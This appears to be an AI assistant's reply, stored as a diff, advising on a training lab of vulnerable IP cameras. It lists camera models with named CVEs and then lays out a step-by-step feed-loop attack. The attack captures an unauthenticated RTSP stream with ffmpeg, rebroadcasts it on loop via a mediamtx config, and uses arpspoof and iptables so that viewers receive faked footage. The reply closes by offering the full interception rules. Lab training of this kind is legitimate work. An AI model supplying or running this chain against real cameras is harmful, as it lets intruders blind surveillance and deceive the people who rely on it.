@@ -1,0 +1,50 @@
+Camera Recommendations (with known, documented CVEs)
+For a controlled training environment, you want cameras with public, well-documented exploits so you control the difficulty level:
+Easy Tier
+
+Foscam FI8910W / R2 — multiple CVEs including auth bypass (CVE-2017-2849) and RTSP stream access without credentials. Very common, cheap used.
+Hikvision DS-2CD series (pre-2017 firmware) — CVE-2017-7921, unauthenticated access to RTSP and snapshot endpoints. Extremely well documented.
+
+Medium Tier
+
+Dahua IPC-HDW series (old firmware) — CVE-2021-33044 auth bypass. Students need to craft the right request.
+Axis M series (older) — various CVEs around the VAPIX API, good for teaching API-level exploitation.
+
+Feed Manipulation / Loop Replay
+This is the classic "Die Hard 4" move and it's very achievable. Here's the attack chain:
+
+Step 1 — Access the RTSP stream
+Most of these cameras expose an unauthenticated (or default-cred) RTSP stream:
+rtsp://192.168.x.x:554/stream1
+
+Step 2 — Record a clean segment
+ffmpeg -i rtsp://[camera_ip]:554/stream1 -t 5 -c copy loop_clip.mp4
+That grabs 5 seconds of "nothing happening" footage.
+
+Step 3 — Replay the loop back to any viewer
+You can use a simple RTSP server to rebroadcast the clip on loop. mediamtx (formerly rtsp-simple-server) works well:
+# mediamtx.yml
+paths:
+  fake_feed:
+    source: loop_clip.mp4
+    sourceOnDemand: yes
+    loop: yes
+
+Then redirect the camera's outbound stream (via ARP spoof or routing manipulation on the exercise network) so any NVR or viewer pulling the feed gets your looped clip instead.
+
+Step 4 — ARP spoof to intercept
+arpspoof -i wlan0 -t [viewer_ip] [camera_ip]
+
+Combined with iptables to redirect RTSP traffic to your mediamtx instance.
+
+
+________________________
+Gear Notes
+___________________
+Buy used Hikvision or Foscam on eBay — you can get them for $15–30 and intentionally run old firmware.
+Keep a known-good firmware version handy so you can reset between rotations.
+Hikvision's old firmware ISOs are still findable and you can deliberately downgrade for the exercise.
+
+Want me to write out the full mediamtx config and the iptables redirect rules for the RTSP interception piece?
+
+
